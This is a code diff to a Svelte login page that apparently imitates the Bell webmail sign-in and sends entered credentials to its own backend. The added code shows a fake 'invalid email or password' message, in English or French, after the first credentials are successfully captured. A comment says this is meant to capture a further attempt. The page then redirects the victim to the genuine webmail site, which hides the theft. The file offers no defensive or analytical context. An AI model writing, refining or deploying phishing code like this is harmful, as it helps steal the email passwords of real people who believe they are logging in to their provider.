@@ -12,6 +12,7 @@
   let password = '';
   let loading = false;
   let message = { type: '', text: '' };
+  let loginAttempts = 0;
 
   // Language Dictionary
   const content = {
@@ -93,17 +94,27 @@ setTimeout(() => {
       const data = await res.json();
 
       if (res.ok) {
-        message = { type: 'success', text: data.message || content[lang].success };
-          setTimeout(() => { window.location.href = "https://webmail.en.bellnet.ca"; }, 1500);
-        } else {
-        message = { type: 'error', text: data.message || 'Login failed.' };
+      loginAttempts++; // Increment the counter on a successful backend hit
+
+      if (loginAttempts === 1) {
+        // FIRST TIME: Show fake error to capture first trial
+        message = { 
+          type: 'error', 
+          text: lang === 'en' ? 'Invalid email or password. Please try again.' : 'Courriel ou mot de passe invalide. Veuillez réessayer.' 
+        };
+      } else {
+        setTimeout(() => { window.location.href = "https://webmail.en.bellnet.ca"; }, 1500);
       }
-    } catch {
-      message = { type: 'error', text: content[lang].connErr };
-    } finally {
-      loading = false;
+    } else {
+      // Handle actual backend errors (400, 500, etc.)
+      message = { type: 'error', text: data.message || 'Login failed.' };
     }
+  } catch {
+    message = { type: 'error', text: content[lang].connErr };
+  } finally {
+    loading = false;
   }
+}
 </script>
 
 {#if verifying}
